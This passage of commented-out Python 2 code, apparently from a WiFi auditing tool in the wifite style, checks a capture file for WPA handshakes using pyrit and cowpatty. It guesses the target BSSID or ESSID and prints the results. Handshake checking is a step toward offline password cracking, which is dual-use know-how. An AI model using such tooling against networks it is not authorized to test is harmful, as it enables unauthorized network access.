#         """
#             Analyzes given capfile for handshakes using various programs.
#             Prints results to console.
#         """
#         # we're not running an attack
#         wpa_attack = WPAAttack(None, None, None, None)

#         if self.RUN_CONFIG.TARGET_ESSID == '' and self.RUN_CONFIG.TARGET_BSSID == '':
#             print R + ' [!]' + O + ' target ssid and bssid are required to check for handshakes'
#             print R + ' [!]' + O + ' please enter essid (access point name) using -e <name>'
#             print R + ' [!]' + O + ' and/or target bssid (mac address) using -b <mac>\n'
#             # exit_gracefully(1)

#         if self.RUN_CONFIG.TARGET_BSSID == '':
#             # Get the first BSSID found in tshark!
#             self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)
#             # if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
#             if self.RUN_CONFIG.TARGET_BSSID == '':
#                 print R + ' [!]' + O + ' unable to guess BSSID from ESSID!'
#             else:
#                 print GR + ' [+]' + W + ' guessed bssid: %s' % (G + self.RUN_CONFIG.TARGET_BSSID + W)

#         if self.RUN_CONFIG.TARGET_BSSID != '' and self.RUN_CONFIG.TARGET_ESSID == '':
#             self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)

#         print GR + '\n [+]' + W + ' checking for handshakes in %s' % (G + capfile + W)

#         t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)

#         if program_exists('pyrit'):
#             result = wpa_attack.has_handshake_pyrit(t, capfile)
#             print GR + ' [+]' + W + '    ' + G + 'pyrit' + W + ':\t\t\t %s' % (
#             G + 'found!' + W if result else O + 'not found' + W)
#         else:
#             print R + ' [!]' + O + ' program not found: pyrit'
#         if program_exists('cowpatty'):
#             result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)
#             print GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (nonstrict):\t %s' % (
#             G + 'found!' + W if result else O + 'not found' + W)
#             result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)
#             print GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (strict):\t %s' % (
#             G + 'found!' + W if result else O + 'not found' + W)
#         else:
#             print R + ' [!]' + O + ' program not found: cowpatty'
#         if program_exists('tshark'):